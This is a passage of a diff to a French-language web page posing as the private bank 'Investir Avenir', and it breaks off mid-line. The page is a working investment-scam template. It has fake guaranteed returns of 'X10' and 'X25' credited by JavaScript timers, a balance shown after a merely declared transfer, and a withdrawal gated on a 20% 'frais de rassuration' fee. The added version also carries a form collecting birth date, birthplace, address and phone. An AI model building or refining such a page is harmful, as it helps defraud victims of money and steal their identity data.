@@ -3,52 +3,77 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Investir Avenir | Institutional Private Banking</title>
+    <title>Investir Avenir | Private Equity & Institutional Banking</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
     <style>
-        :root { --gold: #c5a059; --dark-bg: #0a0b0d; --card-bg: #161a1e; }
+        :root { --gold: #d4af37; --dark-bg: #0a0b0d; --card-bg: #161a1e; }
         body { background-color: var(--dark-bg); color: #eaecef; font-family: 'Inter', sans-serif; }
-        .gold-gradient { background: linear-gradient(135deg, #c5a059 0%, #f1d39b 100%); color: #000; }
+        .gold-gradient { background: linear-gradient(135deg, #d4af37 0%, #f7e08b 100%); color: #000; }
         .card { background-color: var(--card-bg); border: 1px solid #2b3139; }
-        .text-gold { color: #c5a059; }
+        .visa-card { background: linear-gradient(135deg, #1a1a1a 0%, #333 100%); border: 1px solid #444; border-radius: 15px; position: relative; overflow: hidden; }
+        .visa-card::after { content: "VISA"; position: absolute; bottom: 20px; right: 20px; font-style: italic; font-weight: bold; font-size: 20px; color: #fff; opacity: 0.8; }
     </style>
 </head>
 <body class="min-h-screen">
 
-<nav class="border-b border-gray-800 p-5 flex justify-between items-center bg-[#161a1e]/80 backdrop-blur-md sticky top-0 z-50">
+<nav class="border-b border-gray-800 p-4 flex justify-between items-center bg-[#161a1e]/90 sticky top-0 z-50">
     <div class="flex items-center gap-3">
-        <div class="w-10 h-10 gold-gradient rounded-full flex items-center justify-center shadow-lg shadow-gold/20">
-            <i class="fa-solid fa-building-columns text-xl"></i>
+        <div class="w-10 h-10 gold-gradient rounded flex items-center justify-center shadow-lg shadow-gold/10">
+            <i class="fa-solid fa-crown text-xl"></i>
         </div>
-        <span class="text-xl font-black tracking-widest uppercase">Investir <span class="text-gold">Avenir</span></span>
+        <span class="text-xl font-black uppercase tracking-tighter">Investissement <span class="text-gold">&</span> Avenir</span>
     </div>
-    <div id="nav-user" class="hidden flex items-center gap-4">
-        <div class="text-right hidden sm:block">
-            <p id="user-name" class="text-sm font-bold"></p>
-            <p class="text-[10px] text-green-500 font-bold uppercase tracking-tighter">Compte Vérifié Gold</p>
+    <div id="nav-user" class="hidden flex items-center gap-6">
+        <button onclick="showSection('card-view')" class="text-xs font-bold flex items-center gap-2 hover:text-gold transition-all">
+            <i class="fa-solid fa-credit-card"></i> MA CARTE VISA
+        </button>
+        <div class="text-right">
+            <p id="user-display-name" class="text-sm font-black"></p>
+            <p class="text-[9px] text-gold font-bold">MEMBRE PRESTIGE</p>
         </div>
-        <button onclick="location.reload()" class="h-10 w-10 rounded-full bg-gray-800 border border-gray-700 flex items-center justify-center hover:bg-gray-700 transition-all"><i class="fa-solid fa-power-off text-red-500"></i></button>
     </div>
 </nav>
 
 <div class="container mx-auto px-4 py-8">
     
-    <div id="auth-box" class="max-w-md mx-auto mt-12 p-8 card rounded-3xl shadow-2xl">
-        <div class="text-center mb-8">
-            <h2 class="text-2xl font-bold">Accès Client</h2>
-            <p class="text-gray-500 text-sm mt-2">Authentification sécurisée 256-bit</p>
-        </div>
-        
+    <div id="auth-box" class="max-w-xl mx-auto mt-6 p-8 card rounded-3xl shadow-2xl">
         <div id="auth-step-1">
-            <input type="text" id="email" placeholder="Identifiant unique" class="w-full bg-black/40 border border-gray-700 p-4 rounded-xl mb-4 focus:border-gold outline-none transition-all">
-            <input type="password" id="pass" placeholder="Clé de sécurité" class="w-full bg-black/40 border border-gray-700 p-4 rounded-xl mb-6 focus:border-gold outline-none transition-all">
-            <button onclick="nextAuth()" class="w-full gold-gradient py-4 rounded-xl font-black tracking-widest hover:scale-[1.02] transition-transform">S'AUTHENTIFIER</button>
+            <h2 class="text-2xl font-black mb-6 uppercase italic border-b border-gray-800 pb-4">Création de compte sécurisé</h2>
+            <div class="space-y-4">
+                <div>
+                    <label class="text-[10px] text-gray-500 font-black uppercase">Adresse e-mail de connexion</label>
+                    <input type="email" id="email" class="w-full bg-black/40 border border-gray-700 p-4 rounded-xl focus:border-gold outline-none">
+                </div>
+                <div>
+                    <label class="text-[10px] text-gray-500 font-black uppercase">Mot de passe institutionnel</label>
+                    <input type="password" id="pass" class="w-full bg-black/40 border border-gray-700 p-4 rounded-xl focus:border-gold outline-none">
+                </div>
+                <button onclick="toStep2()" class="w-full gold-gradient py-4 rounded-xl font-black tracking-widest mt-4 uppercase">Suivant <i class="fa-solid fa-arrow-right ml-2"></i></button>
+            </div>
         </div>
 
         <div id="auth-step-2" class="hidden">
-            <input type="text" id="prenom" placeholder="Prénom de l'investisseur" class="w-full bg-black/40 border border-gray-700 p-4 rounded-xl mb-6 focus:border-gold outline-none transition-all">
-            <button onclick="login()" class="w-full gold-gradient py-4 rounded-xl font-black tracking-widest">ACTIVER LA SESSION</button>
+            <h2 class="text-xl font-black mb-6 uppercase italic text-gold">Informations d'identité</h2>
+            <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
+                <input type="text" id="nom" placeholder="Nom de famille" class="bg-black/40 border border-gray-700 p-3 rounded-lg outline-none">
+                <input type="text" id="prenom" placeholder="Prénom" class="bg-black/40 border border-gray-700 p-3 rounded-lg outline-none">
+                <input type="date" id="dob" class="bg-black/40 border border-gray-700 p-3 rounded-lg outline-none text-gray-500">
+                <input type="text" id="ville" placeholder="Ville de naissance" class="bg-black/40 border border-gray-700 p-3 rounded-lg outline-none">
+                <select id="nat" class="bg-black/40 border border-gray-700 p-3 rounded-lg outline-none text-gray-400">
+                    <option value="">Nationalité</option>
+                    <option value="FR">Française (+33)</option>
+                    <option value="BE">Belge (+32)</option>
+                    <option value="CH">Suisse (+41)</option>
+                    <option value="LU">Luxembourgeoise (+352)</option>
+                </select>
+                <input type="tel" id="tel" placeholder="Numéro de téléphone" class="bg-black/40 border border-gray-700 p-3 rounded-lg outline-none">
+            </div>
+            <div class="mt-4 space-y-4">
+                <input type="text" id="adresse" placeholder="Numéro et nom de rue" class="w-full bg-black/40 border border-gray-700 p-3 rounded-lg outline-none">
+                <input type="text" id="cp" placeholder="Code Postal" class="w-full bg-black/40 border border-gray-700 p-3 rounded-lg outline-none">
+            </div>
+            <button onclick="finalizeAuth()" class="w-full gold-gradient py-4 rounded-xl font-black tracking-widest mt-6 uppercase">Activer mon espace client</button>
         </div>
     </div>
 
@@ -56,73 +81,46 @@
         <div class="grid grid-cols-1 lg:grid-cols-3 gap-8">
             
             <div class="space-y-6">
-                <div class="card p-8 rounded-[2rem] bg-gradient-to-br from-[#161a1e] to-[#0a0b0d]">
-                    <div class="flex justify-between items-center mb-4">
-                        <span class="text-gray-400 text-xs font-bold uppercase tracking-widest">Actifs Totaux</span>
-                        <i class="fa-solid fa-wallet text-gold"></i>
-                    </div>
-                    <div class="flex items-baseline gap-2">
+                <div id="wallet-card" class="card p-8 rounded-[2rem] bg-gradient-to-br from-[#1e2329] to-[#0a0b0d]">
+                    <span class="text-gray-500 text-[10px] font-black uppercase tracking-widest">Solde Total Disponible</span>
+                    <div class="flex items-baseline gap-2 mt-2">
                         <h2 id="main-balance" class="text-4xl font-black tracking-tighter">0.00</h2>
                         <span class="text-gold font-bold">EUR</span>
                     </div>
-                    <p class="text-[10px] text-gray-500 mt-2 font-mono">ID Portefeuille: #IA-992-00X</p>
-                    
-                    <div class="grid grid-cols-2 gap-4 mt-10">
-                        <button onclick="openModal('recharge')" class="gold-gradient py-4 rounded-2xl text-xs font-black uppercase tracking-tighter shadow-lg shadow-gold/10">Recharger</button>
-                        <button onclick="openModal('retrait')" class="bg-[#2b3139] hover:bg-gray-700 py-4 rounded-2xl text-xs font-black uppercase tracking-tighter transition-all">Retrait</button>
+                    <div class="grid grid-cols-2 gap-3 mt-8">
+                        <button onclick="openModal('recharge')" class="gold-gradient py-3 rounded-xl text-[10px] font-black uppercase">Recharger</button>
+                        <button onclick="openModal('retrait')" class="bg-gray-800 py-3 rounded-xl text-[10px] font-black uppercase">Retrait</button>
                     </div>
                 </div>
 
-                <div class="card p-6 rounded-2xl border-l-4 border-l-gold bg-gold/5">
-                    <h3 class="text-xs font-black mb-2 text-gold uppercase italic">Opportunité du moment</h3>
-                    <p class="text-xs text-gray-400 leading-relaxed">"Le marché européen est en forte hausse. C'est le moment idéal pour capitaliser sur les actifs à haut rendement. Minimum de dépôt conseillé : 5000€ pour un profit maximal."</p>
+                <div id="card-view" class="visa-card p-6 h-48 flex flex-col justify-between shadow-2xl transform hover:scale-105 transition-all">
+                    <div class="flex justify-between items-start">
+                        <i class="fa-solid fa-microchip text-yellow-600 text-3xl"></i>
+                        <i class="fa-solid fa-wifi text-gray-400 rotate-90"></i>
+                    </div>
+                    <div>
+                        <p class="text-lg font-mono tracking-[0.3em] text-white">**** **** **** 8824</p>
+                        <div class="flex justify-between items-end mt-4">
+                            <div>
+                                <p class="text-[8px] text-gray-500 uppercase">Titulaire</p>
+                                <p id="card-holder" class="text-sm font-bold uppercase"></p>
+                            </div>
+                            <div class="text-right">
+                                <p class="text-[8px] text-gray-500 uppercase">Expire fin</p>
+                                <p class="text-xs font-bold">12/29</p>
+                            </div>
+                        </div>
+                    </div>
                 </div>
             </div>
 
             <div class="lg:col-span-2">
-                <div class="flex justify-between items-center mb-6">
-                    <h3 class="text-xl font-bold italic uppercase tracking-tighter">Marché des Capitaux</h3>
-                    <div class="flex gap-2">
-                        <span class="h-2 w-2 bg-green-500 rounded-full animate-pulse"></span>
-                        <span class="text-[10px] text-gray-500 font-bold">LIVE MARKET DATA</span>
-                    </div>
-                </div>
+                <h3 class="text-xl font-black mb-6 italic uppercase tracking-tighter flex items-center gap-3">
+                    <i class="fa-solid fa-chart-line text-gold"></i> Opportunités d'Investissement Institutionnel
+                </h3>
                 
-                <div id="lock-overlay" class="card p-16 rounded-[3rem] text-center bg-gradient-to-b from-transparent to-gold/5">
-                    <div class="w-20 h-20 bg-gray-800 rounded-full flex items-center justify-center mx-auto mb-6 border border-gray-700">
-                        <i class="fa-solid fa-lock text-3xl text-gold"></i>
+                <div id="projects-grid" class="grid grid-cols-1 md:grid-cols-2 gap-4 max-h-[600px] overflow-y-auto pr-2">
                     </div>
-                    <h4 class="text-2xl font-black mb-4 uppercase">Session Restreinte</h4>
-                    <p class="text-gray-400 max-w-sm mx-auto mb-8 text-sm leading-relaxed">Votre compte n'est pas encore provisionné. Effectuez un virement institutionnel pour débloquer les projets à forte croissance.</p>
-                    <button onclick="openModal('recharge')" class="px-10 py-4 gold-gradient rounded-full font-black text-xs uppercase tracking-widest hover:scale-105 transition-all">DÉBLOQUER LES PROJETS</button>
-                </div>
-
-                <div id="projects-list" class="hidden space-y-6">
-                    <div class="card p-6 rounded-2xl flex flex-col sm:flex-row justify-between items-center gap-4 hover:border-gold transition-all group relative overflow-hidden">
-                        <div class="absolute top-0 left-0 w-1 h-full gold-gradient"></div>
-                        <div class="flex-1">
-                            <div class="flex items-center gap-2 mb-2">
-                                <span class="text-[9px] bg-gold/20 text-gold px-2 py-0.5 rounded font-black uppercase tracking-widest">Risque Faible</span>
-                                <span class="text-[9px] bg-green-500/20 text-green-500 px-2 py-0.5 rounded font-black">X10 PROFIT</span>
-                            </div>
-                            <h4 class="text-lg font-black uppercase tracking-tight">Immobilier de luxe - Côte d'Azur</h4>
-                            <p class="text-xs text-gray-500">Investissement sécurisé sur actifs réels. Rendement garanti sous 45 min.</p>
-                        </div>
-                        <button onclick="invest(10)" class="gold-gradient px-6 py-3 rounded-xl font-black text-[10px] uppercase">Investir</button>
-                    </div>
-                    <div class="card p-6 rounded-2xl flex flex-col sm:flex-row justify-between items-center gap-4 hover:border-gold transition-all group relative overflow-hidden">
-                        <div class="absolute top-0 left-0 w-1 h-full bg-blue-500"></div>
-                        <div class="flex-1">
-                            <div class="flex items-center gap-2 mb-2">
-                                <span class="text-[9px] bg-blue-500/20 text-blue-500 px-2 py-0.5 rounded font-black uppercase tracking-widest">High Tech</span>
-                                <span class="text-[9px] bg-blue-500/20 text-blue-500 px-2 py-0.5 rounded font-black font-black">X25 PROFIT</span>
-                            </div>
-                            <h4 class="text-lg font-black uppercase tracking-tight">Mining Crypto Énergie Solaire</h4>
-                            <p class="text-xs text-gray-500">Exploitez la puissance des serveurs IA. Croissance ultra-rapide.</p>
-                        </div>
-                        <button onclick="invest(25)" class="bg-blue-600 text-white px-6 py-3 rounded-xl font-black text-[10px] uppercase">Investir</button>
-                    </div>
-                </div>
             </div>
         </div>
     </div>
@@ -130,155 +128,19 @@
 
 <div id="modal-recharge" class="hidden fixed inset-0 bg-black/95 flex items-center justify-center p-4 z-[100]">
     <div class="card max-w-md w-full p-8 rounded-[2.5rem] relative">
-        <h2 class="text-2xl font-black mb-2 uppercase italic text-gold">Provisionnement</h2>
-        <p class="text-gray-500 text-xs mb-8">Les fonds déposés sont protégés par la garantie européenne.</p>
+        <h2 class="text-2xl font-black mb-4 uppercase italic text-gold">Virement de Recharge</h2>
+        <p class="text-[11px] text-gray-400 mb-6 font-medium">Effectuez le virement vers votre IBAN de rechargement personnel ci-dessous pour alimenter votre compte.</p>
         
-        <div id="recharge-step-1">
-            <label class="text-[10px] text-gray-400 font-black tracking-widest uppercase">Volume d'investissement (Min. 1000€)</label>
-            <div class="relative mt-2">
-                <input type="number" id="recharge-amount" placeholder="1000" class="w-full bg-black/50 border border-gray-700 p-5 rounded-2xl text-2xl font-black outline-none focus:border-gold">
-                <span class="absolute right-5 top-5 text-gray-500 font-bold">€</span>
-            </div>
-            <button onclick="showIban()" class="w-full gold-gradient py-5 rounded-2xl mt-8 font-black tracking-widest uppercase text-sm">Obtenir l'IBAN de dépôt</button>
-        </div>
-
-        <div id="recharge-step-2" class="hidden space-y-6">
-            <div class="bg-black/60 p-5 rounded-2xl border border-gray-800 space-y-4">
+        <div id="recharge-step-info" class="space-y-4">
+            <div class="bg-black/60 p-5 rounded-2xl border border-gray-800 space-y-3">
                 <div>
-                    <label class="text-[9px] text-gray-500 block uppercase font-black">Titulaire Institutionnel</label>
-                    <div class="flex justify-between items-center">
-                        <span class="font-mono text-sm text-gold font-bold">INVESTIR AVENIR</span>
-                        <button onclick="copy('INVESTIR AVENIR')" class="text-[9px] bg-gray-800 text-white px-2 py-1 rounded">COPIER</button>
-                    </div>
+                    <label class="text-[9px] text-gray-500 block uppercase font-black tracking-widest">Titulaire du compte</label>
+                    <span id="iban-name" class="font-bold text-sm text-white uppercase tracking-wider"></span>
                 </div>
                 <div>
-                    <label class="text-[9px] text-gray-500 block uppercase font-black">IBAN (Réseau SEPA)</label>
-                    <div class="flex justify-between items-center">
-                        <span class="font-mono text-[11px] font-bold">FR76 3000 1007 1234 5678 9012 345</span>
-                        <button onclick="copy('FR76 3000 1007 1234 5678 9012 345')" class="text-[9px] bg-gray-800 text-white px-2 py-1 rounded">COPIER</button>
-                    </div>
+                    <label class="text-[9px] text-gray-500 block uppercase font-black tracking-widest">Banque Émettrice</label>
+                    <span class="font-bold text-sm text-gold italic uppercase tracking-wider">Investissement & Avenir</span>
                 </div>
                 <div>
-                    <label class="text-[9px] text-gray-500 block uppercase font-black">Code BIC / SWIFT</label>
-                    <div class="flex justify-between items-center">
-                        <span class="font-mono text-sm font-bold">SCFI FR2P XXX</span>
-                        <button onclick="copy('SCFI FR2P XXX')" class="text-[9px] bg-gray-800 text-white px-2 py-1 rounded">COPIER</button>
-                    </div>
-                </div>
-            </div>
-
-            <div class="p-4 bg-gold/10 border border-gold/20 rounded-xl">
-                <label class="text-[10px] text-gold font-black flex items-center gap-2 mb-3">
-                    <i class="fa-solid fa-clock"></i> HORODATAGE DU VIREMENT
-                </label>
-                <input type="time" id="transfer-time" class="w-full bg-black/50 border border-gray-700 p-4 rounded-xl outline-none focus:border-gold text-white font-bold">
-            </div>
-            <button onclick="validateRecharge()" class="w-full gold-gradient py-5 rounded-2xl font-black shadow-xl shadow-gold/20 uppercase tracking-widest">Confirmer le dépôt</button>
-        </div>
-        <button onclick="closeModal()" class="absolute top-8 right-8 text-gray-500 hover:text-white"><i class="fa-solid fa-xmark text-xl"></i></button>
-    </div>
-</div>
-
-<div id="modal-retrait" class="hidden fixed inset-0 bg-black/95 flex items-center justify-center p-4 z-[100]">
-    <div class="card max-w-md w-full p-10 rounded-[3rem] relative border-red-900/30">
-        <div class="text-center mb-8">
-            <h2 class="text-3xl font-black text-red-500 uppercase italic">Retrait de Fonds</h2>
-            <div class="h-1 w-20 bg-red-500 mx-auto mt-2"></div>
-        </div>
-        
-        <div class="space-y-6 text-center">
-            <p class="text-sm text-gray-400 leading-relaxed">
-                Votre capital actuel est de <span id="withdraw-balance" class="text-white font-black">0.00€</span>. 
-                Pour finaliser l'audit de sortie et débloquer les fonds vers votre IBAN personnel, les <span class="text-white font-black">frais de rassuration de 20%</span> sont obligatoires.
-            </p>
-
-            <div class="bg-gray-900 p-6 rounded-2xl border border-gray-800">
-                <span class="text-[10px] text-gray-500 uppercase font-black">Montant à régulariser (20%)</span>
-                <div class="text-2xl font-black text-red-500 mt-1" id="frais-amount">0,00 €</div>
-                <p class="text-[9px] text-gray-600 mt-2">À verser sur l'IBAN de dépôt habituel.</p>
-            </div>
-
-            <input type="text" placeholder="Entrez votre IBAN de réception" class="w-full bg-black/50 border border-gray-800 p-4 rounded-xl text-white outline-none focus:border-red-500 text-center font-mono">
-            
-            <button onclick="alert('Action requise : Versez les frais de rassuration pour débloquer le virement.')" class="w-full bg-red-600 text-white py-5 rounded-2xl font-black uppercase tracking-widest hover:bg-red-700 transition-all">Exécuter le retrait total</button>
-        </div>
-        <button onclick="closeModal()" class="absolute top-8 right-8 text-gray-500 hover:text-white"><i class="fa-solid fa-xmark text-xl"></i></button>
-    </div>
-</div>
-
-<script>
-    let solde = 0;
-    let multiplier = 1;
-
-    function nextAuth() {
-        document.getElementById('auth-step-1').classList.add('hidden');
-        document.getElementById('auth-step-2').classList.remove('hidden');
-    }
-
-    function login() {
-        const p = document.getElementById('prenom').value;
-        if(!p) return alert("Identification requise");
-        document.getElementById('auth-box').classList.add('hidden');
-        document.getElementById('main-app').classList.remove('hidden');
-        document.getElementById('nav-user').classList.remove('hidden');
-        document.getElementById('user-name').innerText = p;
-    }
-
-    function openModal(id) { 
-        document.getElementById('modal-'+id).classList.remove('hidden'); 
-        if(id === 'retrait') {
-            document.getElementById('withdraw-balance').innerText = solde.toLocaleString() + '€';
-            document.getElementById('frais-amount').innerText = (solde * 0.20).toLocaleString() + ' €';
-        }
-    }
-    
-    function closeModal() { document.querySelectorAll('[id^="modal-"]').forEach(m => m.classList.add('hidden')); }
-
-    function showIban() {
-        const val = document.getElementById('recharge-amount').value;
-        if(val < 1000) return alert("Seuil minimal non atteint (1000€).");
-        document.getElementById('recharge-step-1').classList.add('hidden');
-        document.getElementById('recharge-step-2').classList.remove('hidden');
-    }
-
-    function validateRecharge() {
-        const time = document.getElementById('transfer-time').value;
-        if(!time) return alert("L'horodatage est requis pour la synchronisation.");
-        const montant = parseFloat(document.getElementById('recharge-amount').value);
-        
-        alert("Dépôt déclaré à " + time + ". Validation par le protocole SEPA en cours...");
-        
-        setTimeout(() => {
-            solde = montant;
-            updateUI();
-            document.getElementById('lock-overlay').classList.add('hidden');
-            document.getElementById('projects-list').classList.remove('hidden');
-            closeModal();
-        }, 1500);
-    }
-
-    function invest(multi) {
-        multiplier = multi;
-        alert("Investissement confirmé. Le protocole de croissance est activé. Retour attendu sous 30 à 45 minutes.");
-        
-        // Timer de 30 minutes (pour le test ici c'est 30 secondes pour que tu puisses voir)
-        // Change 30000 par 1800000 pour avoir 30 minutes réelles
-        setTimeout(() => {
-            solde = solde * multiplier;
-            updateUI();
-            alert("ALERTE : Votre investissement a atteint sa maturité ! Nouveau solde : " + solde.toLocaleString() + "€");
-        }, 30000); 
-    }
-
-    function updateUI() {
-        document.getElementById('main-balance').innerText = solde.toLocaleString('fr-FR', {minimumFractionDigits: 2});
-    }
-
-    function copy(txt) {
-        navigator.clipboard.writeText(txt);
-        alert("Donnée copiée avec succès.");
-    }
-</script>
-
-</body>
-</html>
+                    <label class="text-[9px] text-gray-500 block uppercase font-black tracking-widest">IBAN DE RECHARGEMENT (SEPA)</label>
+                    <div class="flex justify
